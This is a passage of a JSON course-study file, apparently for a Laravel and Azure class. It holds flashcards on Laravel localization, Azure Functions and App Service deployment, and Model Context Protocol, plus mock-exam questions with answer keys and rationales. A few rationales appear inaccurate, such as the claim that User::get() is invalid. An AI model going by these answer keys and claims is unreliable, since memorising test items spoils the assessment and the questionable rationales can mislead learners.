`{1}` matches 1, and `[2,*]` matches 7. `:count` is replaced with the numeric argument.","source":"localization.pptx slide 7","bloom":"apply"},{"id":"locale-card-09","type":"cloze","prompt":"The correct path for a JSON French translation file is `resources/lang/{{fr.json}}`, not `resources/lang/fr/messages.json`.","answer":"fr.json","explanation":"JSON translation files sit directly inside `resources/lang/` as `{locale}.json`. PHP translation files go inside a locale subdirectory (`resources/lang/{locale}/filename.php`). Confusing the two causes lookups to fail silently.","example":"`resources/lang/fr.json` for JSON; `resources/lang/fr/messages.php` for PHP array.","source":"localization.pptx slides 3-5; final-practice.docx Q1","bloom":"understand"}]}]},{"id":"cloud-deployment","name":"Cloud Deployment","topics":[{"id":"azure-static-web-apps","name":"Azure Static Web Apps and Functions","tags":["azure","azure-functions","serverless","typescript","static-web-apps"],"prose":"Azure Static Web Apps hosts a SPA front end and an Azure Functions backend together. Azure Functions are event-driven — each function has one trigger and optional bindings declared in function.json.","source":"ts-function-apps.pptx; static-web-apps-SCRIPT.docx","cards":[{"id":"azure-swa-card-01","type":"cloze","prompt":"Azure Functions is an {{event-driven}}, serverless compute service that runs TypeScript/JavaScript without managing servers.","answer":"event-driven","explanation":"Event-driven means the function only runs when a trigger fires. Azure handles all server management; you pay per execution.","source":"ts-function-apps.pptx slide 2","bloom":"remember"},{"id":"azure-swa-card-02","type":"name","prompt":"What is the term for the event that starts an Azure Function — for example, an incoming HTTP request or a timer tick?","answer":"trigger (Azure)","explanation":"Every Azure Function has exactly one trigger. The trigger is declared in function.json and determines what wakes the function up. Common triggers: HTTP, Timer, Queue, Blob, Event Hub.","source":"ts-function-apps.pptx slide 4","bloom":"remember"},{"id":"azure-swa-card-03","type":"cloze","prompt":"A {{binding (Azure)}} connects an Azure Function to an input or output data source declaratively in function.json — no SDK boilerplate needed in the function body.","answer":"binding (Azure)","explanation":"Bindings differ from triggers: a trigger starts the function; bindings are optional and handle data connections. Azure injects input-binding data and flushes output-binding writes automatically.","source":"ts-function-apps.pptx slide 8","bloom":"understand"},{"id":"azure-swa-card-04","type":"name","prompt":"One trigger + zero or many ___: what is the Azure Functions term for the optional declarative connections that read from queues, write to blobs, etc.?","answer":"bindings (Azure)","explanation":"A trigger fires the function (one required). Bindings wire it to other services (zero or many). Both are declared in function.json. Conflating the two is a common exam error on this topic.","source":"ts-function-apps.pptx slides 4, 8","bloom":"understand"},{"id":"azure-swa-card-05","type":"cloze","prompt":"The configuration file that declares triggers and bindings for an Azure Function is called {{function.json}}.","answer":"function.json","explanation":"function.json lives in the function's folder. It lists every binding (including the trigger) with type, direction (in/out), and name.","source":"ts-function-apps.pptx slide 5","bloom":"remember"},{"id":"azure-swa-card-06","type":"cloze","prompt":"An HTTP-triggered Azure Function written in TypeScript receives two parameters: a {{Context}} and an {{HttpRequest}}.","answer":"Context, HttpRequest","explanation":"Context carries context.res (the HTTP response), context.bindings (binding data), and context.log. HttpRequest exposes .query, .body, .headers, and .method.","source":"ts-function-apps.pptx slide 7","bloom":"remember"},{"id":"azure-swa-card-07","type":"name","prompt":"Azure Static Web Apps hosts both a SPA front end and a serverless backend under one URL. What technology powers the backend API?","answer":"Azure Functions","explanation":"Requests to /api/* route to Azure Functions; all other paths serve the static SPA. Both live in the same GitHub repo and deploy together via GitHub Actions.","source":"static-web-apps-SCRIPT.docx","bloom":"understand"}]},{"id":"azure-laravel-deployment","name":"Azure Laravel Deployment","tags":["azure","laravel","deployment","app-service"],"prose":"Deploying a Laravel app to Azure App Service requires a startup.sh script that runs migrations, caches config, and sets Nginx. Environment variables are set in the Azure portal, not in a .env file.","source":"resources/Fixes 2026.html; resources/Steps to Azure Deployment.html","cards":[{"id":"azure-deploy-card-01","type":"cloze","prompt":"The shell script in the Laravel project root that runs at Azure App Service startup is called {{startup.sh}}. Azure executes it via the Startup Command: {{bash /home/site/wwwroot/startup.sh}}.","answer":"startup.sh; bash /home/site/wwwroot/startup.sh","explanation":"Azure App Service has no persistent state between container restarts. The startup script creates the SQLite file, sets permissions, runs migrations, and caches Laravel config so the app is ready to serve requests. Without it, the container starts with a broken Laravel install.","example":"Startup Command field value: `bash /home/site/wwwroot/startup.sh`","source":"resources/Steps to Azure Deployment.html step 6","bloom":"remember"},{"id":"azure-deploy-card-02","type":"name","prompt":"Where do you set Laravel environment variables (APP_KEY, DB_CONNECTION, etc.) when deploying to Azure App Service — instead of using a .env file?","answer":"Azure portal → Settings → Configuration → Application settings","explanation":"Azure containers do not persist files between restarts, and committing .env to git exposes secrets. Application settings in the portal are injected as environment variables at runtime.","example":"Keys to add: APP_KEY, APP_DEBUG, APP_STORAGE, DB_CONNECTION, DB_DATABASE","source":"resources/Steps to Azure Deployment.html step 5","bloom":"remember"},{"id":"azure-deploy-card-03","type":"cloze","prompt":"In the startup script, after clearing the config cache, run {{php artisan config:cache}} to compile environment variables into PHP. Similarly, {{php artisan view:cache}} pre-compiles Blade templates.","answer":"php artisan config:cache; php artisan view:cache","explanation":"`config:cache` is critical on Azure because there is no .env file. It bakes Application settings values into `bootstrap/cache/config.php`. If you skip it, config reads fall through to .env (absent) and the app throws null-config errors.","source":"resources/Fixes 2026.html startup.sh listing","bloom":"understand"},{"id":"azure-deploy-card-04","type":"cloze","prompt":"`php artisan migrate {{--force}}` is used in the startup script because Azure's PHP container is treated as a {{production}} environment, which causes the normal migrate command to require interactive confirmation.","answer":"--force; production","explanation":"Laravel detects a non-local APP_ENV and shows a confirmation prompt for destructive operations. `--force` bypasses that prompt so the startup script can run non-interactively.","example":"`php /home/site/wwwroot/artisan migrate --force`","source":"resources/Fixes 2026.html startup.sh listing","bloom":"understand"},{"id":"azure-deploy-card-05","type":"name","prompt":"What is the absolute path where startup.sh must be placed in the Azure App Service container so that the Startup Command resolves correctly?","answer":"/home/site/wwwroot/startup.sh","explanation":"Azure maps the deployed application root to `/home/site/wwwroot/`. The startup script is committed to the project root (same level as `artisan`, `composer.json`) and lands at that path after deployment.","example":"Project root: startup.sh (same level as artisan) → Azure: /home/site/wwwroot/startup.sh","source":"resources/Steps to Azure Deployment.html steps 2 and 6","bloom":"apply"}]}]},{"id":"mcp-module","name":"Model Context Protocol","topics":[{"id":"mcp-protocol","name":"Model Context Protocol","tags":["mcp","ai","laravel","json-rpc","tools"],"prose":"Model Context Protocol is Anthropic's open standard for connecting AI models to external tools, resources, and data sources. It uses JSON-RPC 2.0 over STDIO or SSE transports.","source":"laravel_mcp.pptx","cards":[{"id":"mcp-card-01","type":"cloze","prompt":"{{Model Context Protocol}} is Anthropic's open standard for connecting AI models to external tools, resources, and data sources.","answer":"Model Context Protocol","explanation":"The full name — not 'MCP protocol' or 'Anthropic protocol' — is the canonical term. It is an open standard, meaning any vendor can implement a compliant client or server.","example":"Claude acting as an MCP client sends a JSON-RPC request to a Laravel MCP server to invoke a tool.","source":"laravel_mcp.pptx slide 2","bloom":"remember"},{"id":"mcp-card-02","type":"name","prompt":"Name the three primitives that an MCP server can expose, in the order specified by the course.","answer":"Tools (MCP), Resources (MCP), Prompts (MCP)","explanation":"Tools are callable actions (side effects); Resources are read-only data sources; Prompts are reusable LLM templates. The course-canonical order is Tools → Resources → Prompts.","example":"A to-do MCP server exposes: Tool = AddTodo, Resource = ListTodos (read), Prompt = SummarizeTodos.","source":"laravel_mcp.pptx slide 4","bloom":"remember"},{"id":"mcp-card-03","type":"name","prompt":"What is the definition of Tools (MCP)?","answer":"Callable actions the AI can invoke — such as API calls, running scripts, or multi-step workflows.","explanation":"Tools have side effects. They are executable functions, not data endpoints or UI components. This distinction is the most-tested wrong answer in past exams (Q3).","example":"A tool named AddTodo accepts a 'title' parameter and inserts a row in the database.","source":"laravel_mcp.pptx slide 4; final-practice.docx Q3","bloom":"understand"},{"id":"mcp-card-04","type":"name","prompt":"What is the definition of Resources (MCP)?","answer":"Data sources exposed to the AI — such as local files, database queries, or cloud documents.","explanation":"Resources are read-only. The AI loads resource content into its context window. Unlike Tools, Resources do not trigger side effects.","example":"A resource named TodoList returns all current to-do items as JSON for the AI to read.","source":"laravel_mcp.pptx slide 4","bloom":"understand"},{"id":"mcp-card-05","type":"cloze","prompt":"Model Context Protocol uses {{JSON-RPC 2.0}} as its message format. Every request includes a method name, an id, and optional params.","answer":"JSON-RPC 2.0","explanation":"JSON-RPC 2.0 defines a lightweight remote procedure call format over JSON. It is the wire protocol for all MCP client-server communication, regardless of transport.","example":"A tools/list request: { \"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"tools/list\" }","source":"laravel_mcp.pptx slides 2-5","bloom":"remember"},{"id":"mcp-card-06","type":"name","prompt":"Name the two transport options Model Context Protocol supports and describe when each is used.","answer":"STDIO (local, same-machine processes) and SSE — Server-Sent Events (remote servers over HTTP streaming).","explanation":"STDIO connects processes on the same machine via stdin/stdout — ideal for local development tools. SSE uses HTTP and works for network-accessible MCP servers.","example":"The laravel_mcp.pptx demo server uses type: 'http' in mcp.json, which means SSE transport.","source":"laravel_mcp.pptx slides 2, 12","bloom":"understand"},{"id":"mcp-card-07","type":"name","prompt":"What is MCP composability?","answer":"The MCP property where a client can also act as a server, enabling nested or chained agent architectures.","explanation":"Because the protocol is symmetric, any node can simultaneously receive requests (server role) and send requests (client role). Multi-agent orchestration uses the same JSON-RPC 2.0 protocol without custom bridges.","example":"Agent A calls Agent B's tools; Agent B calls Agent C's tools. Each hop is a standard JSON-RPC 2.0 message.","source":"laravel_mcp.pptx slide 10","bloom":"understand"},{"id":"mcp-card-08","type":"predict","lang":"php","prompt":"What HTTP method and JSON-RPC method name are used to discover available tools on an MCP server?","code":"// MCP client wants to list all tools the server exposes.\n$body = json_encode([\n    'jsonrpc' =\u003e '2.0',\n    'id'      =\u003e 1,\n    'method'  =\u003e /* ??? */,\n]);\n","answer":"POST request; method is \"tools/list\". The server responds with a JSON array of tool descriptors.","explanation":"tools/list is the standard MCP discovery method. Clients call it before invoking individual tools to learn what capabilities the server exposes.","source":"laravel_mcp.pptx slides 4-5","bloom":"apply"},{"id":"mcp-card-09","type":"predict","lang":"text","prompt":"A server exposes a route that returns all task rows as JSON (read-only). An AI reads this data before answering \"what tasks are overdue?\". Which MCP primitive applies — Tools, Resources, or Prompts?","code":"Scenario:\n- Route: GET /mcp/tasks\n- Behaviour: returns JSON array (read-only, no side effects)\n- AI purpose: load task data into context\n","answer":"Resources (MCP) — a read-only data source loaded into the AI's context, not a side-effecting action.","explanation":"The distinguishing factor is side effects. Tools create, update, or trigger things. Resources only expose data for reading. A plain data-fetch endpoint maps to Resources.","source":"laravel_mcp.pptx slide 4","bloom":"apply"}]},{"id":"laravel-mcp-implementation","name":"Laravel MCP Server Implementation","tags":["mcp","laravel","server","json-rpc","sse"],"prose":"Building an MCP server in Laravel means implementing the tools/list and tools/call endpoints. Each tool definition needs name, description, and inputSchema. SSE transport serves remote clients.","source":"laravel_mcp.pptx","cards":[{"id":"mcp-impl-card-01","type":"cloze","prompt":"An MCP tool definition has three required fields: {{name}}, {{description}}, and {{inputSchema}}.","answer":"name, description, inputSchema","explanation":"The LLM reads 'description' to decide when to invoke the tool. 'inputSchema' is a JSON Schema object that declares the argument types and required fields.","source":"laravel_mcp.pptx slide 4","bloom":"remember"},{"id":"mcp-impl-card-02","type":"cloze","prompt":"The {{description}} field of an MCP tool definition is read by the LLM — not just developers — to decide when and how to invoke the tool.","answer":"description","explanation":"A vague description causes missed or incorrect invocations. The description must state what the tool does, what system it affects, and what it returns.","source":"laravel_mcp.pptx slide 4","bloom":"understand"},{"id":"mcp-impl-card-03","type":"name","prompt":"Which MCP transport uses a persistent HTTP connection with Server-Sent Events — SSE or STDIO?","answer":"SSE","explanation":"SSE keeps an HTTP connection open so the server can stream messages back to the client. It is the correct transport for any Laravel app accessible over HTTP. STDIO uses stdin/stdout pipes for locally-spawned processes only.","source":"laravel_mcp.pptx slide 12","bloom":"remember"},{"id":"mcp-impl-card-04","type":"name","prompt":"A Laravel app is deployed to a public URL. A developer wants Claude Desktop to call its MCP tools. Which transport should the mcp.json config specify?","answer":"SSE (type: http)","explanation":"SSE is for remote HTTP-accessible servers. STDIO requires the client to spawn the server as a local subprocess, which is incompatible with a deployed web app.","example":"`\"type\": \"http\"` in mcp.json points to the server URL and uses SSE transport.","source":"laravel_mcp.pptx slide 12","bloom":"apply"},{"id":"mcp-impl-card-05","type":"name","prompt":"What is the term for an MCP architecture where a single app simultaneously acts as both an MCP client and an MCP server?","answer":"MCP composability","explanation":"Composability means the client and server roles are independent — the same Laravel app can call external MCP tools in one controller while exposing its own tools to Claude via a separate MCP server class.","source":"laravel_mcp.pptx slide 10","bloom":"understand"},{"id":"mcp-impl-card-06","type":"cloze","prompt":"An MCP server exposes two required JSON-RPC 2.0 endpoints: {{tools/list}} (returns available tool definitions) and {{tools/call}} (executes a named tool with arguments).","answer":"tools/list, tools/call","explanation":"tools/list lets any MCP client discover what the server can do. tools/call triggers execution and returns a result. Both use the JSON-RPC 2.0 envelope — not plain REST.","source":"laravel_mcp.pptx slides 11-12","bloom":"remember"}]}]}],"mockExam":{"duration_seconds":3600,"pass_mark":0.6,"questions":[{"id":"artisan-composer-q-01","type":"MCQ","topic":"Artisan CLI and Composer","marks":1,"question":"Which command correctly creates a new Laravel migration file for a `products` table?","choices":["php artisan make-migration create_products_table","php artisan make:migration create_products_table","composer make:migration create_products_table","artisan make:migration create_products_table"],"correct":1,"rationale":"Artisan commands use colon-separated namespaces: `make:migration` (with a colon). The full invocation is always prefixed `php artisan`. Option A (`make-migration` with a hyphen) is the classic exam distractor from past-exam Q6 — hyphenated forms do not exist in Artisan. Option C (`composer make:migration`) confuses Artisan with Composer; `composer` manages dependencies, not app code generation. Option D (`artisan make:migration`) omits the required `php` prefix — `artisan` is a PHP script and must be invoked as `php artisan`.","bloom":"remember","source":"intro_to_laravel.pptx; final-practice.docx Q6","tags":["pretest"]},{"id":"artisan-composer-q-02","type":"MCQ","topic":"Artisan CLI and Composer","marks":1,"question":"A teammate cloned the repository. The `vendor/` folder is absent. Which command restores all PHP dependencies?","choices":["php artisan install","npm install","composer install","composer create-project"],"correct":2,"rationale":"`composer install` reads `composer.json` (and `composer.lock` for exact versions) and downloads all listed dependencies into `vendor/`. This is the standard command for restoring dependencies after a clone. Option A (`php artisan install`) does not exist; Artisan has no `install` command for Composer packages. Option B (`npm install`) installs JavaScript dependencies from `package.json`, not PHP packages. Option D (`composer create-project`) scaffolds a brand-new project — running it inside an existing project would overwrite files rather than restore `vendor/`.","bloom":"remember","source":"intro_to_laravel.pptx; intro_to_laravel_SCRIPT.docx"},{"id":"artisan-composer-q-03","type":"MCQ","topic":"Artisan CLI and Composer","marks":1,"question":"Which Artisan command opens an interactive REPL that boots the full Laravel application so you can test Eloquent models without writing a controller?","choices":["php artisan repl","php artisan test","php artisan serve","php artisan tinker"],"correct":3,"rationale":"`php artisan tinker` launches a PsySH REPL with the full Laravel environment booted. You can call `\\App\\Models\\Student::all()`, create records, or test relationships interactively without writing a controller or opening a browser. Option A (`php artisan repl`) does not exist — the correct name is `tinker`. Option B (`php artisan test`) runs the PHPUnit test suite, not an interactive REPL. Option C (`php artisan serve`) starts the development HTTP server at `localhost:8000` — it is a web server, not a REPL.","bloom":"remember","source":"intro_to_laravel.pptx; intro_to_laravel_SCRIPT.docx"},{"id":"azure-laravel-deployment-q-01","type":"MCQ","topic":"Azure Laravel Deployment","marks":1,"question":"When deploying a Laravel app to Azure App Service, where must the `startup.sh` file be placed so Azure can find and execute it?","choices":["Inside the `public/` directory alongside `index.php`","In the `storage/` directory so the container can write to it","In the project root, alongside `artisan` and `composer.json`","In `.github/workflows/` as part of the GitHub Actions pipeline"],"correct":2,"rationale":"`startup.sh` must reside in the project root — the same level as `artisan`, `composer.json`, and `.env.example`. Azure references it as `/home/site/wwwroot/startup.sh` and the Startup Command field in the portal calls `bash /home/site/wwwroot/startup.sh`. Option A (`public/`) is where web-accessible static files and `index.php` live — putting a shell script there exposes it publicly and is not where Azure looks for the startup script. Option B (`storage/`) is Laravel's runtime cache directory; Azure does not look there for startup scripts. Option D (`.github/workflows/`) is where GitHub Actions CI/CD workflow files live — Azure reads those only during build/deploy, not on each container start.","bloom":"remember","source":"resources/Steps to Azure Deployment.html; resources/Fixes 2026.html"},{"id":"azure-static-web-apps-q-01","type":"MCQ","topic":"Azure Static Web Apps","marks":1,"question":"An Azure Function should write a record to Azure Blob Storage every time it processes an HTTP request. Adding this output capability requires:","choices":["A second HTTP trigger pointed at the Blob Storage endpoint","An output binding declared in function.json","A new Azure Function app with a Blob trigger","A timer trigger set to run after each HTTP trigger fires"],"correct":1,"rationale":"Bindings connect a function to input or output data sources without SDK code in the function body. An output binding for Blob Storage is declared in `function.json` and Azure injects the write capability. The function still starts from its single HTTP trigger — you never add a second trigger. Option A is incorrect: a function has exactly one trigger; adding a second trigger would create a separate function, not add an output capability. Option C would create an entirely separate Function App with a Blob trigger, which fires when a blob is *created* — not when an HTTP request comes in. Option D uses a timer trigger, which fires on a schedule, not in response to another function's execution.","bloom":"understand","source":"ts-function-apps.pptx; static-web-apps-SCRIPT.docx"},{"id":"azure-static-web-apps-q-02","type":"MCQ","topic":"Azure Static Web Apps","marks":1,"question":"In an Azure Static Web App, what happens when a browser request arrives at `/api/students`?","choices":["Azure serves the static SPA index.html and the SPA's router handles the path","Azure routes the request to the matching Azure Function in the backend folder","Azure returns a 404 because API routes must be defined in the SPA's router","Azure redirects the request to a separate App Service running the API"],"correct":1,"rationale":"Azure Static Web Apps routes all requests starting with `/api/` to the Azure Functions backend automatically. Requests to all other paths serve the static SPA files. This split routing is built into the service. Option A describes how SPAs handle client-side routing — that applies to paths *not* under `/api/`. Option C is incorrect — `/api/` paths are always routed to functions, not 404'd. Option D is incorrect — Azure Static Web Apps does not redirect to a separate App Service; the Functions backend is co-deployed in the same service.","bloom":"understand","source":"ts-function-apps.pptx; static-web-apps-SCRIPT.docx"},{"id":"azure-static-web-apps-q-03","type":"MCQ","topic":"Azure Static Web Apps","marks":1,"question":"Deployment to Azure Static Web Apps is configured by linking a GitHub repository. After the link is made, what triggers a new deployment automatically?","choices":["Running `php artisan deploy` from the project root","Every push to the linked branch, via a GitHub Actions workflow Azure generates","Manually clicking 'Deploy' in the Azure portal on each change","A scheduled cron job defined in `function.json`"],"correct":1,"rationale":"When you link a GitHub repository to Azure Static Web Apps, Azure automatically generates a GitHub Actions workflow file in `.github/workflows/`. Every push to the linked branch triggers this workflow, which builds and deploys the app. Option A (`php artisan deploy`) is not a real Artisan command and has nothing to do with Azure Static Web Apps. Option C (manual portal click) describes non-automated deployment; Azure Static Web Apps is designed for continuous deployment. Option D (cron in function.json) would define a timer trigger for a Function, not a deployment pipeline.","bloom":"remember","source":"static-web-apps-SCRIPT.docx"},{"id":"curl-http-client-q-01","type":"MCQ","topic":"cURL HTTP Client","marks":1,"question":"A developer writes the following cURL code:\n\n```php\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, 'https://api.example.com/data');\n$response = curl_exec($ch);\ncurl_close($ch);\n$data = json_decode($response, true);\n```\n\nThe `json_decode()` call fails. What is the most likely reason?","choices":["The URL is set before the handle is initialized","CURLOPT_RETURNTRANSFER was not set to true, so curl_exec() printed to screen and returned true, not the response string","json_decode() requires the response to be decoded with base64_decode() first","curl_close() must be called after json_decode(), not before"],"correct":1,"rationale":"Without `CURLOPT_RETURNTRANSFER =\u003e true`, `curl_exec()` outputs the response body directly to the browser and returns the boolean `true`. The variable `$response` holds `true`, not the JSON string, so `json_decode(true, true)` returns `null`. This is the single most common cURL mistake. Option A is incorrect — `curl_setopt()` can be called at any point after `curl_init()`, and `CURLOPT_URL` can even be passed directly to `curl_init()`. Option C is fabricated — REST API responses are not base64-encoded; they are plain JSON strings. Option D is also incorrect — `curl_close()` frees the handle, and once freed the response string is already in `$response`; calling `json_decode()` after `curl_close()` is the normal sequence.","bloom":"apply","source":"cURL.pptx slides 4–5"},{"id":"eloquent-orm-q-01","type":"MCQ","topic":"Eloquent ORM","marks":1,"question":"Which Eloquent method fetches every row from the table and returns an Eloquent Collection?","choices":["User::get()","User::all()","User::all()-\u003eget()","User::select()-\u003eall()"],"correct":1,"rationale":"`User::all()` is the correct method — it executes a `SELECT *` query and returns an Eloquent Collection of model instances. Option A (`User::get()`) is invalid as a static call on the model class; `-\u003eget()` is a terminal method on a builder chain, not a standalone class method. Option C (`User::all()-\u003eget()`) is a real past-exam distractor: `all()` already executes and returns a Collection; calling `-\u003eget()` again on a Collection is meaningless and would error. Option D (`User::select()-\u003eall()`) reverses the correct chain order — `all()` is a terminal shorthand and cannot follow `select()`.","bloom":"remember","source":"final-practice.docx Q9; laravel_with_students_MySQL_SCRIPT.docx","tags":["pretest"]},{"id":"eloquent-orm-q-02","type":"MCQ","topic":"Eloquent ORM","marks":1,"question":"A controller calls `Student::create(['FirstName' =\u003e 'Ana', 'School' =\u003e 'BCIT'])` and gets a MassAssignmentException. What is the most likely cause?","choices":["The `students` table does not exist in the database","The model is missing a `$fillable` array listing the allowed fields","The `create()` method requires the `--api` flag to be set on the controller","Mass assignment is disabled globally in `config/database.php`"],"correct":1,"rationale":"Eloquent's mass assignment protection blocks `create()` unless the model declares a `$fillable` array listing the permitted field names. When `$fillable` is absent, any `create()` or `fill()` call throws a `MassAssignmentException`. Option A (missing table) would produce a different error — a PDO or query exception, not a MassAssignmentException. Option C (controller flag) is invented — the `--api` flag affects route generation, not mass assignment behavior. Option D (global config) is also incorrect; mass assignment protection is model-level, controlled by the `$fillable` property, not a global config setting.","bloom":"understand","source":"laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx"},{"id":"eloquent-orm-q-03","type":"MCQ","topic":"Eloquent ORM","marks":1,"question":"A `show($id)` controller method calls `Student::findOrFail($id)`. The student with that ID does not exist. What happens next?","choices":["The method returns `null` and execution continues","Laravel throws a MassAssignmentException and returns a 500 response","Laravel throws a ModelNotFoundException and automatically returns a 404 HTTP response","The method returns an empty Eloquent Collection"],"correct":2,"rationale":"`findOrFail()` is designed specifically for the missing-record scenario. When no row matches the given ID, it throws a `ModelNotFoundException`. Laravel's exception handler converts that exception to a 404 HTTP response automatically — no manual check is needed. Option A (`null` return) describes the behavior of `find()`, not `findOrFail()`. Option B (MassAssignmentException) is raised by `create()` or `fill()` without `$fillable` — it has nothing to do with `findOrFail()`. Option D (empty Collection) is what methods like `where()-\u003eget()` return when nothing matches; `findOrFail()` raises an exception instead.","bloom":"apply","source":"laravel_with_sqlite_API_SCRIPT.docx; laravel_with_students_MySQL_SCRIPT.docx"},{"id":"eloquent-orm-q-04","type":"MCQ","topic":"Eloquent ORM","marks":1,"question":"You need students whose `School` is not null, ordered by `FirstName`. Which Eloquent chain is correct?","choices":["Student::all()-\u003ewhereNotNull('School')-\u003eorderBy('FirstName')","Student::whereNotNull('School')-\u003eorderBy('FirstName')-\u003eget()","Student::where('School', '!=', null)-\u003eorderBy('FirstName')","DB::table('students')-\u003ewhereNotNull('School')-\u003eorderBy('FirstName')"],"correct":1,"rationale":"The correct pattern starts the chain on the model class (`Student::whereNotNull(...)`), adds any additional clauses, and terminates with `-\u003eget()` to execute the query and return results. Option A is a classic exam trap: `Student::all()` fetches *every* row first, then the subsequent `where` filters in PHP memory — it does not add a SQL WHERE clause. This also does not call `-\u003eget()` at the end. Option C (`where('School', '!=', null)`) uses a comparison against PHP `null`, not the SQL IS NOT NULL check; use `whereNotNull()` for that. Option D uses Query Builder (`DB::table()`), which is the second-choice pattern — valid but not idiomatic Eloquent.","bloom":"apply","source":"laravel_with_students_MySQL_SCRIPT.docx"},{"id":"eloquent-orm-q-05","type":"MCQ","topic":"Eloquent ORM","marks":1,"question":"Which Artisan command generates both a model class and its corresponding migration file in a single step?","choices":["php artisan make:model Student --migration","php artisan make:model Student -m","php artisan make:model Student && php artisan make:migration","php artisan make:migration Student -m"],"correct":1,"rationale":"The `-m` short flag is the Artisan shorthand that generates both the model file and a timestamped migration in a single command. The source material (laravel_with_students_MySQL_SCRIPT.docx) demonstrates only `-m`; it is the form the exam tests. Option A (`--migration`) is the long-form spelling of the same flag — it produces the same two files — but exam questions about Artisan flags test the shorthand `-m`, not the long form. When both appear as choices, `-m` is the intended answer. Option C achieves the same outcome using two separate commands chained with `&&` — this is not a \"single command\" and defeats the purpose of the shortcut. Option D inverts the command: `make:migration` creates only a migration file; passing `-m` to it has no defined behavior and does not generate a model.","bloom":"remember","source":"laravel_with_students_MySQL_SCRIPT.docx; intro_to_laravel.pptx"},{"id":"jwt-authentication-q-01","type":"MCQ","topic":"JWT Authentication","marks":1,"question":"A JWT token string is structured as three dot-separated sections. What are those sections, in order?","choices":["payload.header.signature","header.signature.payload","header.payload.signature","claims.header.token"],"correct":2,"rationale":"A JWT is always structured as `header.payload.signature` — three base64-encoded sections separated by dots. The header declares the algorithm; the payload carries claims; the signature is computed from the first two and the secret key. Option A reverses header and payload, which is never the case. Option B places the signature in the middle — the signature always comes last because it is derived from the preceding two sections. Option D uses non-standard names that do not correspond to JWT terminology; 'claims' is what the payload *contains*, not the section name.","bloom":"remember","source":"PHP_JWT.pptx; laravel-jwt_SCRIPT.docx","tags":["pretest"]},{"id":"jwt-authentication-q-02","type":"MCQ","topic":"JWT Authentication","marks":1,"question":"Which reserved JWT claim identifies the intended recipient application of the token?","choices":["iss (issuer)","sub (subject)","aud (audience)","jti (JWT ID)"],"correct":2,"rationale":"The `aud` (audience) claim identifies which application or service is the intended consumer of the token. When present, the receiving service must verify it is the intended audience. Option A (`iss`) is the issuer — it identifies *who created* the token, not who should receive it. Option B (`sub`) is the subject — it identifies *who the token is about* (typically the user's ID), not the recipient application. Option D (`jti`) is the JWT ID — a unique identifier for this specific token used to prevent replay attacks; it does not identify the recipient.","bloom":"remember","source":"PHP_JWT.pptx; laravel-jwt_SCRIPT.docx"},{"id":"jwt-authentication-q-03","type":"MCQ","topic":"JWT Authentication","marks":1,"question":"Which Composer package does this course use for JWT authentication in Laravel?","choices":["tymon/jwt-auth","php-open-source-saver/jwt-auth","laravel/passport","firebase/php-jwt"],"correct":1,"rationale":"`php-open-source-saver/jwt-auth` is the package used throughout this course. It is distinct from `tymon/jwt-auth` — a very common real-world package that is explicitly identified as the wrong choice in the course materials. Option A (`tymon/jwt-auth`) is the most common distractor: it is a real and popular package, but it uses a different namespace and setup sequence. Option C (`laravel/passport`) is Laravel's OAuth2 implementation — it uses long-lived personal access tokens, not compact JWTs in the RFC 7519 sense. Option D (`firebase/php-jwt`) is a generic PHP JWT library, not the Laravel-integrated package taught in this course.","bloom":"remember","source":"laravel-jwt_SCRIPT.docx; PHP_JWT.pptx"},{"id":"laravel-localization-q-01","type":"MCQ","topic":"Laravel Localization","marks":1,"question":"You are adding French translations to a Laravel app. Where do you place the JSON translation file for French?","choices":["resources/views/lang/fr.json","storage/lang/fr.json","resources/lang/fr.json","app/lang/fr.json"],"correct":2,"rationale":"JSON translation files live directly under `resources/lang/` named after the locale code — so `resources/lang/fr.json`. This is tested verbatim in past-exam Q1. Option A (`resources/views/lang/`) confuses the `resources/views/` view directory with the `resources/lang/` translation directory — a common distractor. Option B (`storage/lang/`) is where Laravel writes framework-generated files, not developer-authored translation files. Option D (`app/lang/`) has no standard meaning in Laravel's directory layout; translation files are never stored under `app/`.","bloom":"remember","source":"localization.pptx slides 1–11; final-practice.docx Q1","tags":["pretest"]},{"id":"laravel-localization-q-02","type":"MCQ","topic":"Laravel Localization","marks":1,"question":"A Blade template needs to display a localized greeting stored under the key `messages.greeting` in a PHP translation file. Which expression is correct?","choices":["{{ translate('messages.greeting') }}","{{ lang('messages.greeting') }}","{{ i18n('messages.greeting') }}","{{ __('messages.greeting') }}"],"correct":3,"rationale":"`__()` (double underscore) is Laravel's canonical translation helper. For a PHP translation file, dot notation means: look in `resources/lang/{locale}/messages.php` for the key `greeting`. This is tested in past-exam Q2. Option A (`translate()`) is not a Laravel function — it is a common guess from developers with other framework backgrounds. Option B (`lang()`) is not the correct helper in Laravel; `lang()` is sometimes confused with the `Lang` facade's static method but is not a standalone helper function. Option C (`i18n()`) does not exist in Laravel — it is borrowed from JavaScript i18n conventions, not PHP.","bloom":"remember","source":"localization.pptx slides 1–11; final-practice.docx Q2"},{"id":"laravel-localization-q-03","type":"MCQ","topic":"Laravel Localization","marks":1,"question":"Which Laravel helper handles pluralization rules such as `'{0} No items|{1} One item|[2,*] :count items'`?","choices":["__() with a count argument","trans_choice()","App::pluralize()","Str::plural()"],"correct":1,"rationale":"`trans_choice()` is the dedicated pluralization helper. It accepts a translation key and a count; it selects the correct pipe-delimited variant and replaces `:count` with the number. Option A (`__()` with a count argument) is incorrect — `__()` does not accept a count argument for pluralization; its second argument is for parameter replacement, not plural selection. Option C (`App::pluralize()`) does not exist in Laravel. Option D (`Str::plural()`) is a string utility that derives the English plural form of a word (e.g., `'apple'` → `'apples'`) — it does not handle translation files or locale-aware plural rules.","bloom":"understand","source":"localization.pptx slides 1–11; laravel-localization.docx"},{"id":"laravel-localization-q-04","type":"MCQ","topic":"Laravel Localization","marks":1,"question":"A language-switcher route stores `'fr'` in the session. Which call inside a middleware applies that locale to the current request?","choices":["App::locale('fr')","session()-\u003esetLocale('fr')","App::setLocale('fr')","config('app.locale', 'fr')"],"correct":2,"rationale":"`App::setLocale('fr')` is the correct facade call for changing the active locale at runtime. The middleware reads the stored value from the session and calls this method so every subsequent `__()` lookup uses the French translation files. Option A (`App::locale('fr')`) uses the wrong method name — `getLocale()` reads the locale, `setLocale()` sets it. Option B (`session()-\u003esetLocale('fr')`) is invented — the session facade has no `setLocale` method; locale state lives in the App facade, not the session. Option D (`config('app.locale', 'fr')`) reads a config value with a fallback; it does not override the runtime 